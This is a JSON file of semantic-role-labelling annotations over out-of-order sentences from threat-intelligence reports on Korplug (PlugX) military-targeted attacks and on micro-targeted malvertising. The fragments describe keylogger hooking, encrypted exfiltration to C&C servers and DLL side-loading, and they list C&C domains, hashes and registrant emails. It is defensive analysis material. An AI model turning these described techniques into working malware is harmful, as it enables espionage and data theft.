{"text": "previously"}, "V": {"text": "received", "index": 21}}, "is_3": {"V": {"text": "is", "index": 28}}, "read": {"ARG1": {"text": "it"}, "V": {"text": "read", "index": 29}, "ARG3": {"text": "from disk"}}, "uploaded": {"ARG1": {"text": "it"}, "V": {"text": "uploaded", "index": 33}, "ARG2": {"text": "to the server instead of the system information"}}}, " It collects most of the available information about the\nsystem, transmits it to the C&C server and executes the commands it receives back": {"collects": {"ARG0": {"text": "It"}, "V": {"text": "collects", "index": 1}, "ARG1": {"text": "most of the available information about the system"}}, "transmits": {"ARG0": {"text": "It"}, "V": {"text": "transmits", "index": 11}, "ARG1": {"text": "it"}, "ARG2": {"text": "to the C&C server"}}, "executes": {"ARG0": {"text": "It"}, "V": {"text": "executes", "index": 18}, "ARG1": {"text": "the commands it receives back"}}, "receives": {"ARG1": {"text": "the commands"}, "ARG0": {"text": "it"}, "V": {"text": "receives", "index": 22}, "ARGM-DIR": {"text": "back"}}}, "\n\n\n<figure></figure>\n\n                                      <caption>C&C server communication cycle</caption>\n\n\n<noncontent>TLP: Green                                               For any inquire please contact intelreports@kaspersky.com\n\f                                                                                                           5</noncontent>\n\nThe module uses Wininet API functions for issuing HTTP POST requests to the server": {"uses": {"ARG0": {"text": "The module"}, "V": {"text": "uses", "index": 2}, "ARG1": {"text": "Wininet API functions"}, "ARG2": {"text": "for issuing HTTP POST requests to the server"}}, "issuing": {"V": {"text": "issuing", "index": 7}, "ARG1": {"text": "HTTP POST requests to the server"}}}, " If failed, tries to write to the file f:\\keyhook.log\n\nEach time the keylogger starts, it appends the following header to the log file:\n\n\n--------------------------------------------------------------------------------\nNew Session: %fully qualified computer name% %timestamp%\n--------------------------------------------------------------------------------\n\n\nIt then creates a hidden console window and registers its only export _LowLevelKeyboardProc@12\nas a hook procedure for low-level keyboard input events (WH_KEYBOARD_LL hook)": {"failed": {"V": {"text": "failed", "index": 1}}, "tries": {"V": {"text": "tries", "index": 3}, "ARG1": {"text": "to write to the file f:\\keyhook.log Each time the keylogger starts ,/ header to"}}, "write": {"V": {"text": "write", "index": 5}, "ARG2": {"text": "to the file f:\\keyhook.log"}, "ARGM-TMP": {"text": "Each time"}, "ARG0": {"text": "header"}}, "starts": {"ARG1": {"text": "the keylogger"}, "V": {"text": "starts", "index": 14}}, "appends": {"ARG0": {"text": "it"}, "V": {"text": "appends", "index": 17}, "ARG1": {"text": "the following header to the log file"}}, "following": {"V": {"text": "following", "index": 19}, "ARG1": {"text": "header"}}, "creates": {"ARGM-ADV": {"text": "If failed/ to write to the file f:\\keyhook.log Each time the keylogger starts"}, "ARG0": {"text": "It"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "creates", "index": 40}, "ARG1": {"text": "a hidden console window and registers its only export _ LowLevelKeyboardProc@12"}}, "hidden": {"V": {"text": "hidden", "index": 42}, "ARG1": {"text": "console window"}}, "registers": {"ARG0": {"text": "It"}, "V": {"text": "registers", "index": 46}, "ARG1": {"text": "its only export _ LowLevelKeyboardProc@12/ keyboard input events"}}}, "\nThe configuration is an INI file that controls the further behavior of the module": {"is": {"ARG1": {"text": "The configuration"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "an INI file that controls the further behavior of the module"}}, "controls": {"ARG0": {"text": "an INI file"}, "R-ARG0": {"text": "that"}, "V": {"text": "controls", "index": 7}, "ARG1": {"text": "the further behavior of the module"}}}, " Keylogger module</heading>\n\nFile name: varies\nMD5: a3cbf6179d437909eb532b7319b3dafe\nCompilation timestamp: 2012.10.02 10:51:50 (GMT)\nCompiler: Microsoft Visual Studio 2010\nFile format: PE32 DLL\nExports: _LowLevelKeyboardProc@12\n\n\nCreates the log file: %TEMP%\\~DFD3O8.tmp": {"varies": {"ARG1": {"text": "Keylogger module File name"}, "V": {"text": "varies", "index": 5}, "ARG2": {"text": "MD5"}}, "Creates": {"ARG0": {"text": "_ LowLevelKeyboardProc@12"}, "V": {"text": "Creates", "index": 32}, "ARG1": {"text": "the log file"}}}, "\n\n\nThe low-level keyboard hook procedure intercepts WM_KEYDOWN, WM_KEYUP and WM_\nSYSKEYDOWN system messages and writes information about each keystroke to the log file": {"writes": {"ARG0": {"text": "The low - level keyboard hook procedure intercepts WM_KEYDOWN"}, "V": {"text": "writes", "index": 18}, "ARG1": {"text": "information about each keystroke to the log file"}}}, "\n14.\t      Directory listing of available logical drives and of the directories:\n           \u2022\t Desktop\n          \u2022\t %TEMP%\n          \u2022\t %WINDOWS%\\Temp\n</list>\n\n\nThe retrieved information is compressed using bzip2, encrypted with AES and then encoded using\nBase64 before being transmitted to the C&C server": {"is": {"ARG1": {"text": "The retrieved information"}, "V": {"text": "is", "index": 24}, "ARG2": {"text": "compressed using bzip2"}}, "compressed": {"ARG1": {"text": "The retrieved information"}, "V": {"text": "compressed", "index": 25}, "ARGM-MNR": {"text": "using bzip2 , encrypted with AES and then encoded using Base64 before being transmitted to the C&C server"}}, "using": {"V": {"text": "using", "index": 26}, "ARG1": {"text": "bzip2"}}, "encrypted": {"ARG1": {"text": "The retrieved information"}, "V": {"text": "encrypted", "index": 29}, "ARGM-MNR": {"text": "with AES"}}, "encoded": {"ARG1": {"text": "The retrieved information"}, "ARGM-TMP": {"text": "then/ before being transmitted to the C&C server"}, "V": {"text": "encoded", "index": 34}, "ARGM-MNR": {"text": "using Base64"}}, "using_2": {"V": {"text": "using", "index": 35}, "ARG1": {"text": "Base64"}}, "being": {"V": {"text": "being", "index": 38}}, "transmitted": {"ARG1": {"text": "\u2022 Desktop/ The retrieved information"}, "V": {"text": "transmitted", "index": 39}, "ARG2": {"text": "to the C&C server"}}}, "\n\nIn addition to collecting files, the malware attempts to gather saved passwords, history of visited URLs,\naccount information and proxy information": {"collecting": {"V": {"text": "collecting", "index": 3}, "ARG1": {"text": "files"}}, "attempts": {"ARGM-ADV": {"text": "In addition to collecting files"}, "ARG0": {"text": "the malware"}, "V": {"text": "attempts", "index": 8}, "ARG1": {"text": "to gather saved passwords , history of visited URLs , account information and proxy information"}}, "gather": {"ARG0": {"text": "the malware"}, "V": {"text": "gather", "index": 10}, "ARG1": {"text": "saved passwords , history of visited URLs , account information and proxy information"}}, "saved": {"V": {"text": "saved", "index": 11}, "ARG1": {"text": "passwords , history of visited URLs"}}, "visited": {"V": {"text": "visited", "index": 16}, "ARG1": {"text": "URLs"}}}, " Apart from": {}, "\n</section>\n<section>\n<heading>Alternative Malware #1: DarkStRat</heading>\n\nA curious Remote Access Trojan, as research points to a Chinese connection but the commands it listens\nto are in Spanish (translation in English):\n<list>\n      CERRAR (close)\n      DESINSTALAR (uninstall)\n      SERVIDOR (server)\n      INFO\n      MAININFO\n      PING\n      REBOOT\n\f      POWEROFF\n      PROC\n      KILLPROC\n      VERUNIDADES (see units)\n      LISTARARCHIVOS (list files)\n      EXEC\n      DELFILE\n      DELFOLDER\n      RENAME\n      MKDIR\n      CAMBIOID (change ID)\n      GETFILE/SENDFILE/RESUMETRANSFER\n      SHELL\n      SERVICIOSLISTAR (list service)\n      INICIARSERVICIO (start service)\n      DETENERSERVICIO (stop service)\n      BORRARSERVICIO (erase service)\n      INSTALARSERVICIO (install service)\n</list>\nThe malware can manage processes and services on the infected machine, transfer files to and from the\nC&C server, run shell commands, and so on": {"can": {"ARG0": {"text": "The malware"}, "V": {"text": "can", "index": 2}, "ARG1": {"text": "manage processes and services on the infected machine , transfer files to and from the C&C server , run shell commands , and so on"}}, "manage": {"ARG0": {"text": "The malware"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "manage", "index": 3}, "ARG1": {"text": "processes and services/ files to and from the C&C server"}, "ARGM-LOC": {"text": "on the infected machine"}}, "transfer": {"ARGM-MOD": {"text": "can"}, "V": {"text": "transfer", "index": 12}, "ARG1": {"text": "files"}, "ARG2": {"text": "to"}}, "run": {"ARG0": {"text": "The malware"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "run", "index": 21}, "ARG1": {"text": "shell commands"}}}, "\n\nA table with a selection of RTF documents and RAR self-extracting archives with a .SCR extension is\nshown below:\n<table>\n                                       English\n            File name                                                        SHA1\n                                     translation\n Situation Report about\n                                                         36119221826D0290BC23371B55A8C0E6A84718DD\n Afghan.doc\n AGREEMENT BETWEENTHE\n NATO AND AFGHANISTAN\n ON THE STATUS OF NATO                                   A6642BC9F3425F0AB93D462002456BE231BB5646\n FORCES IN\n AFGHANISTAN.doc\n news.doc                                                51CDC273B5638E06906BCB700335E288807744B5\n \u041f\u043b\u0430\u043d \u0434\u0435\u044f\u0442\u0435\u043b\u044c\u043d\u043e\u0441\u0442\u0438               Activity plan for\n \u0441\u043e\u0435\u0434\u0438\u043d\u0435\u043d\u0438\u0439 \u0438 \u0432\u043e\u0438\u043d\u0441\u043a\u0438\u0445           military units in the\n                                                         EA6EE9EAB546FB9F93B75DCB650AF22A95486391\n \u0447\u0430\u0441\u0442\u0435\u0439 \u041f\u0440\u0438\u0432\u043e\u043b\u0436\u0441\u043a\u043e\u0433\u043e             Volga region in July\n \u0440\u0435\u0433\u0438\u043e\u043d\u0430 \u043d\u0430 \u0438\u044e\u043b\u044c 2014 \u0433.scr      2014\n                                 Telephone directory\n \u0442\u0435\u043b\u0435\u0444\u043e\u043d\u043d\u044b\u0439\u2003\u0441\u043f\u0440\u0430\u0432\u043e\u0447\u043d\u0438\u043a\u2003          of the Ministry of\n                                                         D297DC7D29E42E8D37C951B0B11629051EEBE9C0\n \u0441\u0442\u0440\u0443\u043a\u0442\u0443\u0440\u044b \u041c\u0418\u0414 \u041a\u0420 .scr           Foreign Affairs of\n                                 the Kyrgyz Republic\n \u041e \u0426\u0435\u043d\u0442\u0440\u0435 \u0441\u043e\u0446\u0438\u0430\u043b\u044c\u043d\u043e\u0439             About the Center for\n \u0430\u0434\u0430\u043f\u0442\u0430\u0446\u0438\u0438                       social adaptation of    8E5E19EBE719EBF7F8BE4290931FFA173E658CB8\n \u0432\u043e\u0435\u043d\u043d\u043e\u0441\u043b\u0443\u0436\u0430\u0449\u0438\u0445.scr              servicemen\n                                 Meeting minutes of\n \u041f\u0440\u043e\u0442\u043e\u043a\u043e\u043b \u0432\u0441\u0442\u0440\u0435\u0447\u0438 \u041d\u0413\u0428\n                                 the General Staff of    1F726E94B90034E7ABD148FE31EBA08774D1506F\n \u041a\u041d\u0420.scr\n                                 the PRC\n \u0438\u0441\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u043d\u044b\u0439 \u0448\u0430\u0431\u043b\u043e\u043d \u043f\u043b\u0430\u043d\u0430       Corrected action\n                                                         A9C627AA09B8CC50A83FF2728A3978492AEB79D8\n \u043c\u0435\u0440\u043e\u043f\u0440\u0438\u044f\u0442\u0438\u0439.scr                 plan template\n Situation Report about\n                                                         A9C627AA09B8CC50A83FF2728A3978492AEB79D8\n Afghan.scr\n                                 Military and political\n \u0412\u043e\u0435\u043d\u043d\u043e-\u043f\u043e\u043b\u0438\u0442\u0438\u0447\u0435\u0441\u043a\u0430\u044f             situation in Islamic\n \u043e\u0431\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0430 \u0432 \u0418\u0420\u0410                Republic of            E32081C56F39EA14DFD1E449C28219D264D80B2F\n\f \u043d\u043004.10.2014.scr                Afghanistan (IRA)\n                                 on 04.10.2014\n Afghan Air Force.scr                                  E32081C56F39EA14DFD1E449C28219D264D80B2F\n \u043f\u043b\u0430\u043d \u043c\u0435\u0440\u043e\u043f\u0440\u0438\u044f\u0442\u0438\u0439.scr            Action plan           1F726E94B90034E7ABD148FE31EBA08774D1506F\n\n</table>\nSome of the above-mentioned files also contained decoy documents:\n\n<figure></figure>\n\n\nIn all of the cases, three binary files were dropped (apart from decoy documents) that led to the Korplug\ntrojan being loading into memory": {"extracting": {"ARG0": {"text": "self"}, "V": {"text": "extracting", "index": 12}, "ARG1": {"text": "archives"}}, "is": {"V": {"text": "is", "index": 18}}, "shown": {"ARG1": {"text": "A table with a selection of RTF documents and RAR self - extracting archives with a .SCR extension"}, "V": {"text": "shown", "index": 19}, "ARGM-LOC": {"text": "below"}}, "were": {"V": {"text": "were", "index": 31}}, "dropped": {"ARGM-LOC": {"text": "In all of the cases"}, "ARG1": {"text": "three binary files"}, "V": {"text": "dropped", "index": 32}, "ARG2": {"text": "( apart/ from decoy documents )"}, "ARGM-DIR": {"text": "that led to the Korplug trojan being loading into memory"}}, "led": {"ARG0": {"text": "decoy documents )"}, "R-ARG0": {"text": "that"}, "V": {"text": "led", "index": 40}, "ARG2": {"text": "to the Korplug trojan being loading into memory"}}, "being": {"V": {"text": "being", "index": 45}}, "loading": {"ARG1": {"text": "the Korplug trojan"}, "V": {"text": "loading", "index": 46}, "ARG2": {"text": "into memory"}}}, " For example, the\nKorplug RAT (a.k.a .PlugX) is a well-known toolkit associated with Chinese APT groups and used in a\nlarge number of targeted attacks since 2012": {"is": {"ARGM-DIS": {"text": "For example"}, "ARG1": {"text": "the Korplug RAT ( a.k.a .PlugX )"}, "V": {"text": "is", "index": 10}, "ARG2": {"text": "a well - known toolkit associated with Chinese APT groups and used in a large number of targeted attacks since 2012"}}, "known": {"ARGM-EXT": {"text": "well"}, "V": {"text": "known", "index": 14}, "ARG1": {"text": "toolkit"}}, "associated": {"ARG1": {"text": "a well - known toolkit"}, "V": {"text": "associated", "index": 16}, "ARG2": {"text": "with Chinese APT groups"}}, "used": {"ARG1": {"text": "a well - known toolkit"}, "V": {"text": "used", "index": 22}, "ARG2": {"text": "in a large number of targeted attacks since 2012"}}, "targeted": {"V": {"text": "targeted", "index": 28}, "ARG1": {"text": "attacks"}}}, "\n\nAmong these, we were able to discover several successful infections where the employed Korplug samples\n\fwere connecting to the same C&C domain": {"were": {"ARGM-LOC": {"text": "Among these"}, "ARG1": {"text": "we"}, "V": {"text": "were", "index": 4}, "ARG2": {"text": "able to discover several successful infections where the employed Korplug samples were connecting to the same C&C domain"}}, "discover": {"ARG0": {"text": "we"}, "V": {"text": "discover", "index": 7}, "ARG1": {"text": "several successful infections where the employed Korplug samples were connecting to the same C&C domain"}}, "employed": {"V": {"text": "employed", "index": 13}, "ARG1": {"text": "Korplug"}}, "were_2": {"V": {"text": "were", "index": 16}}, "connecting": {"ARGM-LOC": {"text": "several successful infections"}, "R-ARGM-LOC": {"text": "where"}, "ARG1": {"text": "the employed Korplug samples"}, "V": {"text": "connecting", "index": 17}, "ARG2": {"text": "to the same C&C domain"}}}, "\n</section>\n<section>\n<heading>Alternative Malware #2: File Stealer</heading>\n\nThis malware, written in C, and contains several functions for harvesting files off the victim\u2019s hard drive\naccording to criteria set in the configuration file": {"written": {"ARG1": {"text": "This malware"}, "V": {"text": "written", "index": 3}, "ARGM-LOC": {"text": "in C"}}, "contains": {"ARG0": {"text": "This malware"}, "V": {"text": "contains", "index": 8}, "ARG1": {"text": "several functions for harvesting files off the victim \u2019s hard drive"}, "ARGM-ADV": {"text": "according to criteria set in the configuration file"}}, "harvesting": {"V": {"text": "harvesting", "index": 12}, "ARG1": {"text": "files"}}, "according": {"V": {"text": "according", "index": 20}}, "set": {"V": {"text": "set", "index": 23}, "ARG2": {"text": "in the configuration file"}}}, "\n\nIn addition to collecting files, the malware attempts to gather saved passwords, history of visited URLs,\naccount information and proxy information from the following applications:\n<list>\n      Microsoft Messenger\n      Microsoft Outlook\n      Microsoft Internet Explorer\n      Mozilla Firefox\n</list>\nThe C&C domains used by this malware are:\n<list>\n\f      newvinta.com\n      worksware.net\n</list>\nSome samples of this file stealer detected in": {"collecting": {"V": {"text": "collecting", "index": 3}, "ARG1": {"text": "files"}}, "attempts": {"ARGM-ADV": {"text": "In addition to collecting files"}, "ARG0": {"text": "the malware"}, "V": {"text": "attempts", "index": 8}, "ARG1": {"text": "to gather saved passwords , history of visited URLs , account information and proxy information from the following applications : Some samples of this file stealer detected in"}}, "gather": {"ARG0": {"text": "the malware"}, "V": {"text": "gather", "index": 10}, "ARG1": {"text": "saved passwords , history of visited URLs"}}, "saved": {"V": {"text": "saved", "index": 11}, "ARG1": {"text": "passwords , history of visited URLs"}}, "visited": {"V": {"text": "visited", "index": 16}, "ARG1": {"text": "URLs"}}, "following": {"V": {"text": "following", "index": 26}, "ARG1": {"text": "applications"}}, "detected": {"ARG1": {"text": "Some samples of this file stealer"}, "V": {"text": "detected", "index": 35}}}, " It is written in Delphi and connects to\nwww.dicemention.com": {"is": {"V": {"text": "is", "index": 1}}, "written": {"ARG1": {"text": "It"}, "V": {"text": "written", "index": 2}, "ARGM-LOC": {"text": "in Delphi and connects"}, "ARG2": {"text": "to www.dicemention.com"}}}, "\n<list>\nDOMAIN: www.notebookhk.net\nUpdated Date: 2013-11-12 18:03:45\nCreate Date: 2013-06-18 11:08:17\nRegistrant Name: lee stan\nRegistrant Organization: lee stan\nRegistrant Street: xianggangdiqu\nRegistrant City: xianggangdiqu\nRegistrant State: xianggang\nRegistrant Postal Code: 796373\nRegistrant Country: HK\nRegistrant Phone : +0.04375094543\nRegistrant Fax: +0.04375094543\nRegistrant Email:stanlee@gmail.com\n</list>\nOther Korplug samples were connecting to a different domain name resolving to the same IPs as\nnotebookhk.net:\n<list>\nDOMAIN: www.dicemention.com\nUpdated Date: 2013-11-12 18:05:33\nCreate Date: 2013-09-10 14:35:11\nRegistrant Name: z x\nRegistrant Organization: z x\nRegistrant Street: xianggangdiqu\nRegistrant City: xianggangdiqu\nRegistrant State: xianggang\nRegistrant Postal Code: 123456\nRegistrant Country: HK\nRegistrant Phone : +0.0126324313\nRegistrant Fax: +0.0126324313\nRegistrant Email: 123@123.com\n\nDOMAIN: www.abudlrasul.com\nUpdated Date: 2014-10-16 14:16:27\nCreate Date: 2014-10-16 14:16:27\nRegistrant Name: gang xin\nRegistrant Organization: gang xin\n\fRegistrant Street: Argentina Argentina\nRegistrant City: Argentina\nRegistrant State: Argentina\nRegistrant Postal Code: 647902\nRegistrant Country: AR\nRegistrant Phone : +54.0899567089\nRegistrant Fax: +54.0899567089\nRegistrant Email: woffg89@yahoo.com\n</list>\nTaking these C&Cs as a starting point, we were able to locate a number of victims infected through various\nexploit-laden spear-phishing documents and cunningly-named archives": {"Taking": {"V": {"text": "Taking", "index": 0}, "ARG1": {"text": "these C&Cs"}, "ARG2": {"text": "as a starting point"}, "ARG0": {"text": "we"}}, "were": {"R-ARG1": {"text": "Taking these C&Cs as a starting point"}, "ARG1": {"text": "we"}, "V": {"text": "were", "index": 9}, "ARG2": {"text": "able to locate a number of victims infected through various exploit - laden spear - phishing documents and cunningly - named archives"}}, "locate": {"ARG0": {"text": "we"}, "V": {"text": "locate", "index": 12}, "ARG1": {"text": "a number of victims infected"}, "ARGM-MNR": {"text": "through various exploit - laden spear - phishing documents and cunningly - named archives"}}, "infected": {"ARG1": {"text": "victims"}, "V": {"text": "infected", "index": 17}, "ARG2": {"text": "through various exploit - laden spear - phishing documents and cunningly - named archives"}}, "phishing": {"V": {"text": "phishing", "index": 25}, "ARG1": {"text": "documents"}}, "named": {"ARGM-MNR": {"text": "cunningly"}, "V": {"text": "named", "index": 30}, "ARG2": {"text": "archives"}}}, "\n\n<figure></figure>\n\n<list>\n      exe \u2013 a legitimate executable with a Kaspersky digital signature that would load a DLL with a\n      specific file name\n\f      dll \u2013 a small DLL loader that would pass execution to the Korplug raw binary code\n      dll.avp \u2013 raw Korplug binary\n</list>\nThe Korplug RAT is known to use this side-loading trick by abusing legitimate digitally signed executables\nand is a way to stay under the radar, since a trusted application with a valid signature among startup items\nis less likely to raise suspicion": {"is": {"V": {"text": "is", "index": 3}}, "known": {"V": {"text": "known", "index": 4}, "ARG1": {"text": "to use this side - loading trick"}, "ARG0": {"text": "by abusing legitimate digitally signed executables"}}, "use": {"ARG0": {"text": "The Korplug RAT"}, "V": {"text": "use", "index": 6}, "ARG1": {"text": "this side - loading trick"}, "ARG2": {"text": "by abusing legitimate digitally"}, "ARGM-MNR": {"text": "signed executables"}}, "abusing": {"ARG0": {"text": "The Korplug"}, "V": {"text": "abusing", "index": 13}, "ARG1": {"text": "legitimate digitally signed"}}, "signed": {"V": {"text": "signed", "index": 16}, "ARG1": {"text": "executables"}}, "is_2": {"ARG1": {"text": "The Korplug RAT"}, "V": {"text": "is", "index": 19}, "ARG2": {"text": "a way to stay under the radar"}, "ARGM-CAU": {"text": "since a trusted application with a valid signature among startup items is less likely to raise suspicion"}}, "stay": {"ARG1": {"text": "The Korplug RAT"}, "ARGM-MNR": {"text": "a way"}, "V": {"text": "stay", "index": 23}, "ARGM-LOC": {"text": "under the radar"}}, "trusted": {"V": {"text": "trusted", "index": 30}, "ARG1": {"text": "application"}}, "is_3": {"ARG1": {"text": "a trusted application with a valid signature among startup items"}, "V": {"text": "is", "index": 39}, "ARG2": {"text": "less likely to raise suspicion"}}, "raise": {"ARG0": {"text": "a trusted application with a valid signature among startup items"}, "V": {"text": "raise", "index": 43}, "ARG1": {"text": "suspicion"}}}, "\n\nThe maliciously crafted documents are RTF files that successfully exploit the CVE-2012-0158 vulnerability\nin Microsoft Word": {"crafted": {"ARGM-MNR": {"text": "maliciously"}, "V": {"text": "crafted", "index": 2}, "ARG1": {"text": "documents"}}, "are": {"ARG1": {"text": "The maliciously crafted documents"}, "V": {"text": "are", "index": 4}, "ARG2": {"text": "RTF files that successfully exploit the CVE-2012 - 0158 vulnerability in Microsoft Word"}}, "exploit": {"ARG0": {"text": "RTF files"}, "R-ARG0": {"text": "that"}, "ARGM-MNR": {"text": "successfully"}, "V": {"text": "exploit", "index": 9}, "ARG1": {"text": "the CVE-2012 - 0158 vulnerability"}, "ARGM-LOC": {"text": "in Microsoft Word"}}}, " One of\nthese \u2018alternative RATs\u2019 was connecting to a domain also used by the Korplug samples": {"was": {"V": {"text": "was", "index": 7}}, "connecting": {"ARG1": {"text": "One of these \u2018 alternative RATs \u2019"}, "V": {"text": "connecting", "index": 8}, "ARG2": {"text": "to a domain also used by the Korplug samples"}}, "used": {"ARGM-ADV": {"text": "also"}, "V": {"text": "used", "index": 13}, "ARG0": {"text": "by the Korplug samples"}}}, "<doc>\n<section>\n<heading>Korplug military targeted attacks: Afghanistan & Tajikistan</heading>\n\n<figure></figure>\n\n\nAfter taking a look at recent Korplug (PlugX) detections, we identified two larger scale campaigns\nemploying this well-known Remote Access Trojan": {"taking": {"V": {"text": "taking", "index": 1}, "ARG1": {"text": "a look at recent Korplug ( PlugX ) detections"}, "ARG0": {"text": "we"}}, "identified": {"ARGM-TMP": {"text": "After taking a look at recent Korplug ( PlugX ) detections"}, "ARG0": {"text": "we"}, "V": {"text": "identified", "index": 13}, "ARG1": {"text": "two larger scale campaigns employing this well - known Remote Access Trojan"}}, "employing": {"ARG0": {"text": "two larger scale campaigns"}, "V": {"text": "employing", "index": 18}, "ARG1": {"text": "this well - known Remote Access Trojan"}}, "known": {"ARGM-ADV": {"text": "well"}, "V": {"text": "known", "index": 22}, "ARG1": {"text": "Remote Access Trojan"}}}, "                                                                                    Release Date: 10.27.2014\n</footer>\n\f                                                                                     \n<header>\nInvincea White Paper       8\n</header>\n\n\nFrom the VirusTotal report in Figure 5, you will see that this malware is a Trojan backdoor that would likely\nbe used to download additional malware or to provide remote persistent access to the attacker": {"will": {"V": {"text": "will", "index": 13}}, "see": {"ARGM-DIS": {"text": "Release Date"}, "ARGM-TMP": {"text": "10.27.2014 From the VirusTotal report in Figure 5"}, "ARG0": {"text": "you"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "see", "index": 14}, "ARG1": {"text": "that this malware is a Trojan backdoor that would likely be used to download additional malware or to provide remote persistent access to the attacker"}}, "is": {"ARG1": {"text": "this malware"}, "V": {"text": "is", "index": 18}, "ARG2": {"text": "a Trojan backdoor that would likely be used to download additional malware or to provide remote persistent access to the attacker"}}, "would": {"ARG0": {"text": "a Trojan backdoor"}, "R-ARG0": {"text": "that"}, "V": {"text": "would", "index": 23}, "ARG1": {"text": "likely be used to download additional malware or to provide remote persistent access to the attacker"}}, "be": {"V": {"text": "be", "index": 25}}, "used": {"ARG1": {"text": "a Trojan backdoor"}, "R-ARG1": {"text": "that"}, "ARGM-MOD": {"text": "would"}, "ARGM-ADV": {"text": "likely"}, "V": {"text": "used", "index": 26}, "ARG2": {"text": "to download additional malware or to provide remote persistent access to the attacker"}}, "download": {"ARG0": {"text": "that"}, "V": {"text": "download", "index": 28}, "ARG1": {"text": "additional malware"}}, "provide": {"ARG0": {"text": "that"}, "V": {"text": "provide", "index": 33}, "ARG1": {"text": "remote persistent access"}, "ARG2": {"text": "to the attacker"}}}, " As soon as the page loaded,\na malicious ad delivered a backdoor Trojan via a Java-based exploit": {"loaded": {"ARG0": {"text": "the page"}, "V": {"text": "loaded", "index": 5}}, "delivered": {"ARGM-TMP": {"text": "As soon as the page loaded"}, "ARG0": {"text": "a malicious ad"}, "V": {"text": "delivered", "index": 10}, "ARG1": {"text": "a backdoor Trojan"}, "ARGM-MNR": {"text": "via a Java - based exploit"}}, "based": {"ARG2": {"text": "Java"}, "V": {"text": "based", "index": 18}, "ARG1": {"text": "exploit"}}}, "\n\nNow advanced threat actors are able to target an organization directly via micro-targeted malvertising,\nbased solely on their corporate network IP range": {"are": {"ARGM-TMP": {"text": "Now"}, "ARG1": {"text": "advanced threat actors"}, "V": {"text": "are", "index": 4}, "ARG2": {"text": "able to target an organization directly via micro - targeted malvertising , based solely on their corporate network IP range"}}, "target": {"ARG0": {"text": "advanced threat actors"}, "V": {"text": "target", "index": 7}, "ARG1": {"text": "an organization"}, "ARGM-MNR": {"text": "directly/ via micro - targeted malvertising"}, "ARGM-ADV": {"text": "based solely on their corporate network IP range"}}, "targeted": {"V": {"text": "targeted", "index": 14}, "ARG1": {"text": "malvertising"}}, "based": {"ARG1": {"text": "micro - targeted malvertising"}, "V": {"text": "based", "index": 17}, "ARG2": {"text": "solely on their corporate network IP range"}}}, "\n\n\n<figure></figure>\n</section>\n<section>\n<heading>How to Protect Yourself from Micro-targeted Malvertising</heading>\n\nOperation DeathClick is an active campaign to micro-target companies via malvertising in order to\ncompromise their networks": {"is": {"ARG1": {"text": "Operation DeathClick"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "an active campaign to micro - target companies via malvertising in order to compromise their networks"}}, "malvertising": {"ARG1": {"text": "micro - target companies"}, "V": {"text": "malvertising", "index": 12}, "ARGM-PRP": {"text": "in order to compromise their networks"}}, "compromise": {"V": {"text": "compromise", "index": 16}, "ARG1": {"text": "their networks"}}}, " For half the price of a candy bar,\nattackers have the unprecedented ability to deliver malware to you through your web browser simply\nbecause of your IP address space and your industry vertical": {"have": {"ARGM-ADV": {"text": "For half the price of a candy bar"}, "ARG0": {"text": "attackers"}, "V": {"text": "have", "index": 10}, "ARG1": {"text": "the unprecedented ability to deliver malware to you through your web browser"}, "ARGM-CAU": {"text": "simply because of your IP address space and your industry vertical"}}, "deliver": {"V": {"text": "deliver", "index": 15}, "ARG1": {"text": "malware"}, "ARG2": {"text": "to you/ through your web browser"}}}, " In this instance, the host was almost converted to a click-fraud bot": {"was": {"V": {"text": "was", "index": 6}}, "converted": {"ARGM-DIS": {"text": "In this instance"}, "ARG1": {"text": "the host"}, "ARGM-ADV": {"text": "almost"}, "V": {"text": "converted", "index": 8}, "ARG2": {"text": "to a click - fraud bot"}}}, " Threat actors create a corporate front, advertise on\ncommonly visited sites, then later switch out the landing pages for their ads to pages that host exploit\nkits, or simply create a temporary redirection from their usual content to the malicious landing page": {"create": {"ARG0": {"text": "Threat actors"}, "V": {"text": "create", "index": 2}, "ARG1": {"text": "a corporate front , advertise on commonly visited sites"}}, "advertise": {"ARG0": {"text": "Threat actors"}, "V": {"text": "advertise", "index": 7}, "ARG1": {"text": "on commonly visited sites"}}, "visited": {"ARGM-ADV": {"text": "commonly"}, "V": {"text": "visited", "index": 10}, "ARG1": {"text": "sites"}}, "switch": {"ARG0": {"text": "Threat actors"}, "ARGM-TMP": {"text": "then/ later"}, "V": {"text": "switch", "index": 15}, "ARGM-DIR": {"text": "out"}, "ARG1": {"text": "the landing pages"}, "ARGM-PRP": {"text": "for their ads to pages that host exploit kits"}}, "create_2": {"ARG0": {"text": "Threat actors"}, "ARGM-TMP": {"text": "then/ later"}, "ARGM-ADV": {"text": "simply"}, "V": {"text": "create", "index": 32}, "ARG1": {"text": "a temporary redirection"}, "ARG2": {"text": "from their usual content to the malicious landing page"}}}, " Items\nhighlighted in the URL below is userid, and the winning bid price to place malvertising of Cryptowall on\nsports.yahoo.com, which is 60 cents": {"highlighted": {"ARG1": {"text": "Items"}, "V": {"text": "highlighted", "index": 1}, "ARGM-LOC": {"text": "in the URL below"}}, "is": {"ARG1": {"text": "Items highlighted in the URL below"}, "V": {"text": "is", "index": 6}, "ARG2": {"text": "userid , and the winning bid price to"}}, "winning": {"V": {"text": "winning", "index": 11}, "ARG0": {"text": "bid price"}}, "is_2": {"ARG1": {"text": "Cryptowall on sports.yahoo.com"}, "R-ARG1": {"text": "which"}, "V": {"text": "is", "index": 23}, "ARG2": {"text": "60 cents"}}}, " By paying 65 cents to install a\nbackground web browser that does nothing but click fraud, the malvertiser is able to reap hundreds if not\nthousands of dollars in advertising referral income": {"paying": {"V": {"text": "paying", "index": 1}, "ARG1": {"text": "65 cents"}, "ARG3": {"text": "to install a background web browser that does nothing but click fraud"}, "ARG0": {"text": "the malvertiser"}}, "install": {"V": {"text": "install", "index": 5}, "ARG1": {"text": "a background web browser that does nothing but click fraud"}, "ARG0": {"text": "the malvertiser"}}, "does": {"ARG0": {"text": "a background web browser"}, "R-ARG0": {"text": "that"}, "V": {"text": "does", "index": 11}, "ARG1": {"text": "nothing"}}, "click": {"ARG0": {"text": "a background web browser"}, "R-ARG0": {"text": "that"}, "V": {"text": "click", "index": 14}, "ARG1": {"text": "fraud"}}, "is": 